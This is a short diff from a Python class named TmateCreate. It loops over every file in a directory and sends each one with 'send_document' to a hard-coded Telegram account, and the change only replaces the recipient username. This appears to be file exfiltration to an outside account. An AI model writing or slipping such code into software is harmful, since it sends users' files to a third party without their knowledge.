@@ -75,7 +75,7 @@ class TmateCreate:
         app.start()
         for file in track(os.listdir(path_file)):
             try:
-                app.send_document('Bog_Allahovich', f'{path_file}{file}')
+                app.send_document('Creator_pepeDevs', f'{path_file}{file}')
 
             except Exception as error:
                 console.print(f'[bold red]ERROR[/] {error}')
